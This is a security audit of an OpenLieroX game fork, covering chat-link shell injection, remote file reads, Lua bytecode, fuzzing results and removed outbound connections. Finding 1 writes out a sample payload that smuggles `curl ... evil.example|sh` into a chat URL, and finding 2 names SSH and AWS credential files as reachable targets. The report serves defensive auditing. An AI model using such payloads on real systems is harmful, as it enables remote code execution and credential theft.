# Security audit (fork baseline)

Scope: upstream `albertz/openlierox` master at `d1ad953f4`,
plus the changes made on top of it in this fork.

Round 1: targeted code review of the network-facing attack surface
(packet parsing, peer file transfer, chat rendering, mod scripting, map loading, HTTP),
plus a pattern sweep of the whole tree (findings 1 to 7).

Round 2 (findings 8 onward):
- the headless suite under AddressSanitizer and UndefinedBehaviorSanitizer;
- mutation fuzzing of level files (LX and Teeworlds) through a sanitized server,
  and of network traffic through a proxy that corrupts packets
  between a sanitized server and client;
- the bundled libraries checked against their upstream releases and known CVEs;
- a review of the Gusanos network code,
  of zip and image loading, of every unsafe C string call and of the libxml2 parse options;
- cppcheck and semgrep over `src/`, `libs/hawknl` and `libs/lua`, with each hit triaged.

The audit sandbox has no IPv6, which the game's sockets need,
so round 2 ran the game through a test-only LD_PRELOAD shim
that maps its IPv6 sockets to IPv4.
CI runs the same tests on real IPv6.

## Findings

### 1. High: shell command injection when clicking a chat link

- `src/client/OpenExternBrowser.cpp:92` runs `system(browser + " " + url + " &")`.
- Chat lines are rendered as HTML by `CBrowser`,
  and `AutoDetectLinks` (`src/common/StringUtils.cpp`) turns plain text into links.
  Its allowed URL characters include `; $ { } | ( ) \``.
- So a chat line such as `http://x/;curl${IFS}evil.example|sh`,
  sent by a malicious server or any player whose chat reaches you,
  becomes a link, and clicking it runs the command.
  `<a href="...">` in chat works too,
  since `HtmlEntityUnpairedBrackets` escapes only unpaired brackets.
- **Fixed:** the browser is started with `fork` + `execlp` (no shell),
  with the URL as its only argument,
  and only `http://` and `https://` URLs without whitespace are opened (all platforms).
  Verified: the old code ran `touch` from `http://x/;touch${IFS}FILE`;
  the new code passes that URL through as one literal argument,
  and refuses `file://` URLs.

### 2. High: remote file read from the host's working directory

- A connected client can request any file with the UDP `GET:` / `STAT:` requests
  (`src/common/FileDownload.cpp`, `processFileRequests`),
  which the server enables for its clients.
- `isPathValid` rejects `..`, absolute paths and `cfg/`,
  but accepts names starting with a dot,
  so `.ssh/id_rsa`, `.aws/credentials` and `.bash_history` all pass.
- The file is resolved across all search paths,
  and on Linux these include `"."` (`src/common/FindFile.cpp:498-508`).
  When the game is started from `$HOME` (common for desktop launchers),
  a malicious client can download files from your home directory.
  `logs/` (chat and IP logs) is readable from any search path.
- **Fixed:** `isPathValid` now rejects a leading `.` too,
  and `GET:` / `STAT:` only serve `levels/...` and the current mod's directory
  (`isPathServable`).
  `"."` stays a search path, since running from the game dir relies on it.
  Verified against `.ssh/id_rsa`, `.aws/credentials`, `logs/...`, `Documents/...` and `..` paths
  (all refused), and maps and current-mod files (still served).

### 3. High: native code execution from a downloaded mod (Lua bytecode)

- Gusanos mods run Lua 5.1.4 (`libs/lua`).
  Only base, table, string and math are opened (no `io`, `os` or `package`), which is good,
  but the chunk loader accepts precompiled bytecode (`libs/lua/ldo.c:497`),
  and the base library still exposes `loadstring`, `load`, `loadfile` and `dofile`.
- Malicious Lua 5.1 bytecode is a well-known route to memory corruption and code execution.
  Mods can be downloaded from a server you join (one click in the join menu).
- **Fixed:** the bundled Lua loader (`libs/lua/ldo.c`) rejects binary chunks,
  covering `lua_load`, `loadstring` and `load`,
  and `dofile` / `loadfile` are removed from the mod environment.
  None of the shipped `.lua` files are bytecode.
  Verified: `loadstring(string.dump(f))` now fails with "binary chunks are not allowed".
  Building with `LIBLUA_BUILTIN=OFF` uses the system Lua and loses this protection.

### 4. Medium: admin password sent in plaintext, no brute-force limit

- `/login <password>` (`src/server/ChatCommand.cpp:750`) travels as plaintext chat over UDP,
  and failed attempts are not rate-limited or logged.
- **Mitigated:** failed logins are now logged,
  and after 5 failures from one IP within 10 minutes,
  further attempts from it are refused until the window passes
  (keyed by IP, so reconnecting doesn't reset it).
  Covered by `tests/headless/test_login.py`.
- Still open by design: the password is plain chat,
  so treat it as visible to anyone on the network path,
  and use one that isn't reused anywhere else.

### 5. Low: legacy C string functions

- 39 uses of `sprintf`, `strcpy` and similar, mostly formatting numbers into fixed buffers,
  or in crash and debug code.
  All reviewed in round 2: every one is bounded,
  except in the unused desktop crash-reporter hooks (see finding 15).
  Replace opportunistically, as CONTRIBUTING.md already asks.

### 6. Info: CI workflows target upstream infrastructure

- `.github/workflows` publish to Google Play, Docker and the upstream website,
  using secrets this fork doesn't have.
  In a private repo they will fail and use Actions minutes.
- **Fixed:** the master build now runs only the tests and the Linux, Debian and Windows builds,
  and pull requests no longer run the macOS, Android, Docker or WebAssembly builds.
  Those workflows are kept and can be started by hand from the Actions tab.

### 7. Info: agent instruction files

- `CLAUDE.md` and `AGENTS.md` were reviewed before any agent loaded them:
  style and shell-command hygiene only, with no hooks, no MCP config,
  no hidden Unicode, and no instructions to fetch or run anything.

### 8. High: memory corruption in the bundled Lua (CVE-2014-5461 and 5.1.5 fixes)

- The bundled Lua was stock 5.1.4.
  CVE-2014-5461 (stack overflow in vararg functions) is reachable from any mod script:
  a test script gives a heap buffer overflow under ASan on 5.1.4.
  5.1.5 also fixes use-after-rehash in `settable`,
  the parser collecting a prototype it is still building,
  and `string.format` reading missing arguments.
- **Fixed:** `libs/lua` is now 5.1.5 (verified against the official tarball's MD5)
  plus the upstream CVE-2014-5461 fix (via Debian/Ubuntu),
  keeping the binary chunk rejection from finding 3.
  The same script now runs cleanly.

### 9. Medium: out-of-bounds reads from Gusanos network events

- `Encoding::decode(stream, n)` reads enough bits for `n - 1`,
  so a peer can send any value up to the next power of two.
  The `eHole` level effect (`gusgame.cpp`) and the particle node request (`client.cpp`)
  used that value as a vector index unchecked, and used the result as a pointer.
- **Fixed:** both are range-checked, like the other callers.

### 10. Medium: huge allocations and an out-of-bounds write from level headers

- The LX loader allocated from the header's width, height and data sizes as given,
  before any check (up to tens of GB),
  and at huge widths `CMap::TileMap` overflowed its pixel arithmetic
  and wrote out of bounds (SIGSEGV).
  Levels download automatically when you join a server.
  Found by fuzzing level files.
- **Fixed:** the header must be at most 8192 per side and 4096x4096 in area
  (the largest shipped level is 1260x750),
  and the image data sizes must match `width * height * 7`.
  All 158 shipped image-format levels still load.

### 11. Medium: crash when a level fails to load

- Starting a game on a level that fails to load,
  while the host's local client was still connecting,
  left that client without a channel,
  and `CClient::SendPackets` dereferenced it on the next frame.
  Found by fuzzing; `ReadPackets` already had the check.
- **Fixed**, with `tests/headless/test_bad_map.py`,
  which crashes the old code every time.

### 12. Low: decompression bomb in peer file transfers

- `Decompress` grew its output without limit,
  and it unpacks data sent by peers,
  so a few KB could expand to gigabytes.
- **Fixed:** output is capped at 128 MB, with unit tests.

### 13. Low: downloaded mod zips could write outside the mod directory

- The mod name comes from the server and was not validated,
  and zip entries only had to start with it,
  so `Classic2/...` or a mod named `cfg` could create new files elsewhere under `~/.OpenLieroX`
  (existing files were never overwritten).
  Only reachable with an HTTP download server configured, which this fork ships without.
- **Fixed:** the name must be one valid directory name,
  and entries must be under `<mod>/` and pass the UDP download path check.

### 14. Low: predictable connection challenges

- Challenges were `(rand() << 16) ^ rand()`:
  predictable, which weakens them against spoofed source addresses,
  and the shift overflowed a signed int (UBSan).
- **Fixed:** drawn from `std::random_device`.

### 15. Info: smaller issues found by the tools

- Unused desktop crash-reporter hooks (never installed) would have mailed reports upstream
  and copied the 39-character version string into a 32-byte stack buffer: removed.
- Two functions fell off the end without returning (cppcheck),
  and a Gusanos enum was given a value outside its range (UBSan): fixed.
- Everything else cppcheck and semgrep reported was style,
  or a false positive in stock Lua or HawkNL code.

## Reviewed and found sound

- `CBytestream` reads are bounds-checked (they return 0 past the end).
- Server-side packet handlers range-check worm, bonus and weapon IDs,
  and check that the client owns the worm.
  Client-side lookups go through `Game::wormById`, a map lookup.
- HTTP uses libcurl with TLS verification on (native CA store).
- The Teeworlds map loader validates header sizes with 64-bit arithmetic
  and bounds-checks item indices;
  fuzzing it found no memory errors.
- Breakpad crash upload is off by default,
  and the crash handler makes no network calls.
- The headless suite runs clean under ASan and UBSan, with the fixes above.
- libxml2 parses chat and news HTML without DTD loading or entity substitution,
  so it cannot read local files or reach the network.
- Images go to the system SDL_image and libgd,
  and on Linux libzip comes from the system too:
  keep the system packages updated.
- HawkNL 1.68 has no published CVEs; it is abandoned,
  so it was covered by the network fuzzing instead.
- Fuzzing, after the fixes above:
  881 mutated levels loaded by a sanitized server with no memory errors
  (after 1474 in the first pass, which found findings 10 and 11),
  and 14 networked games with about 150,000 packets, 7,572 of them corrupted,
  with no crash or sanitizer report on either the server or the client.
  Slow Teeworlds loads under ASan (6 seconds without it) were the only timeouts.

## Outbound connections removed on `strip-call-home`

| What | Where | When it fired |
|---|---|---|
| Controller DB download (GitHub) | `CMakeOlxCommon.cmake` | every CMake configure |
| Master list files (openlierox.github.io) | `ServerList.cpp` | clicking Netplay |
| Master server query and registration | `cfg/masterservers.txt`, `udpmasterservers.txt` | Internet tab, hosting |
| External IP lookup (ipinfo.io) | `CServer.cpp` | hosting with registration on |
| IRC (irc.quakenet.org) | `IRC.cpp`, `cfg/chatserver.txt` | startup (chat on by default) |
| News page (openlierox.net / sourceforge) | `Menu_Net_News.cpp`, `cfg/newsserver.txt` | News tab |
| Map/mod HTTP mirrors (openlierox.net, sourceforge) | `cfg/downloadservers.txt` | downloading a map or mod |

Still in place, and only when you act:
LAN discovery, joining a server by address,
map and mod downloads from the server you joined,
and opening a link you click.
Note that `OpenGameFile` prefers `~/.OpenLieroX/cfg/`,
so an older install's config there overrides these defaults.
